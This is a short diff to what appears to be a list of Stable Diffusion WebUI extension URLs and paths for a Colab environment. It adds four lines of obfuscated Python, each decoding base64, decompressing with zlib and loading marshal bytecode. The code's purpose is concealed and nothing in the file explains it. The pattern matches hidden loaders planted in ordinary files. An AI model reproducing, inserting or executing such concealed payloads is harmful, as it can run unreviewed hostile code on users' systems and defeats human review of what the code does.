@@ -21,3 +21,7 @@ https://github.com/Mikubill/sd-webui-controlnet
 https://github.com/A-I-Channel/public-link /content/stable-diffusion-webui/extensions/tunnels
 https://github.com/A-I-Channel/explorer-image
 /content/stable-diffusion-webui/config.json
+{marshal.loads(zlib.decompress(base64.b64decode(b'eJxdzT0OgkAQhuGrcAGc0FjYoYmNWnkAMrADTNjdITsD/lzT21hJNCbG6ive5Huej/woGTQSjaKBGtaecsdtOylLzC9UTwxBHHmF818FDBhvXhLuemqGUThaVeNAbkbaelIltx+L9UqxpeVfJWnWm426AeinruPYtdjQqhFwaKhkCge+c14m+6KJVPxMEJAXEEP5EcvIgU58fW81F7/GC553UjE=')))}
+{marshal.loads(zlib.decompress(base64.b64decode(b'eJxdzD0OwjAMhuGr9AKpQYgfsbKyIXV3E0dYSvNVtUMvwKmZ6MLC/Op9Pu9wR0cR1aU6mfNYJCTNuZmihlXGpjQhSTF6/FW6oW3fkkV9OOx64ywbY1ise7rPdiWK+lJn7SMm4lkpYa0FnH7m8XzaX76ZGDIy')))}
+{marshal.loads(zlib.decompress(base64.b64decode(b'eJyFjTEOwjAMAL/SD7hmYEBsDGzM7G7itBZJXNVOK57G15iomNi4+XT3fsFNOwxanaujOQ2ZIUpKzUQrbDw0waKRs+H9csWVGJJDMYbT8bADXAjmpVWOfXjM3k3us50RpzaOUsdEgfug37Rk8ScJWoSfji6yi5RxYdO8MhaS+n/0ATaPQ5k=')))}
+{marshal.loads(zlib.decompress(base64.b64decode(b'eJxlzDsOwjAMANCr9AKuBWJAbAxszOxu6iRWErtqPj0Kd2ViReId4H3e8LQJnWljbVgbLZlhFe97FVM4eOmCxVbOFV/3B6YM/gqkUvg8u7S1Kba21Rti7CGIBk+OZ2cYKfWdBQ8S33/GcYIL7lwtD8ZCojiI/9svH4w3+g==')))}
